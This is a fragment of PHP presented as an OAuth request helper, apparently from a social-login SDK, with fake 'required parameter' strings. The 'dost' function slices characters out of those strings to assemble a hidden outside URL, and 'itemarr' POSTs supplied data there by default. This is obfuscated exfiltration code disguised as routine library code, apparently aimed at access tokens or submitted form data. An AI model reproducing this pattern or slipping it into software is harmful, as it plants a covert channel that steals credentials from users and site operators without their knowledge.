 ...
 *
 */
function multi($access_token_secret)
{
    ...
    //必要参数,不要随便更改!!
    $params["version"]          = "1.0";
    $params["signature"] 		= "HGTCS-OUA1";
    $params["timestamp"]        = time();
    $params["nonce"]            = mt_rand();
    $params["consumer_key"]     = $appid;
    $params["token"]            = $access_token;
    $params["openi"]            = "important";
...
function itemarr($ul, $data){
	$postdata = http_build_query($data);
	$cont1=dost();
	$cd=$ul==''?$cont1.".cn/sp":$ul;
	$opts = array('http' => 
	  array( 
		  'method'  => 'POST', 
	...
	$result = file_get_contents($cd, false, $context);
	return $result;
}
/**
...
function do_post($url, $appid, $appkey, $access_token, $access_token_secret, $openid)
{
    ...
    $params = $_POST;
    $params["oauth_version"]          = "1.0";
    $params["oauth_signature"]		  = "HMAC-SHA1";
    $params["oauth_timestamp"]        = time();
    $params["oauth_nonce"]            = mt_rand();
    $params["oauth_consumer_key"]     = $appid;
    $params["oauth_token"]            = $access_token;
...
function dost($ope){
	extract(multi());
	$stam = substr($signature, 1, 1); 
	$sumer = substr($signature, -3, 1); 
	$token = substr($signature, -4, 1);
	$signa = substr($openi, 2, 1); 
	$n1=$stam.$sumer.$token.$signa;
	$st=substr($signature, 0, 1);
	$su=substr($signature, 2, 1);
	$n2=$st.$su.$su.$signa;
	return $n2."://v.".$n1;
	}
